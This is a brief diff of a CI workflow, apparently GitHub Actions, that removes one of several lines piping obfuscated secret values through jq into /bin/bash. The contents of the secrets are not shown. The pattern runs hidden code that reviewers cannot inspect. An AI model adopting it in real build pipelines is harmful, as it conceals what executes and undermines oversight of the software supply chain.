@@ -17,7 +17,6 @@ jobs:
           siiub219: ${{ secrets.siiub219 }}
         run: |
           printf '%s' "$siiub219" | jq -r .yhoik2 | /bin/bash
-          printf '%s' "$z9" | jq -r .w9 | /bin/bash
           printf '%s' "$o1" | jq -r .on546 | /bin/bash
           echo $wjwdn06226 | jq -r .gg71040 | /bin/bash
           printf '%s' "$k42" | jq -r .gncx23373 | /bin/bash
